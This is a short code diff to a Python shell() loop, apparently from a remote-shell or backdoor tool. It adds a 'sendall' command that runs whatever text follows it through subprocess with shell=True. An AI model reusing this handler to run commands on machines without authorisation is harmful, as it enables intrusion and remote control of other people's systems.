@@ -68,8 +68,14 @@ def shell():
         if command == 'q':
             continue
 
+        # Close connection
         elif command == 'exit':
             break
+
+        # Receive command and exec
+        elif command[:7] == "sendall":
+            sp.Popen(command[8:], shell=True)
+            
         # Showing help
         elif command == 'help':
                 help_opts = """
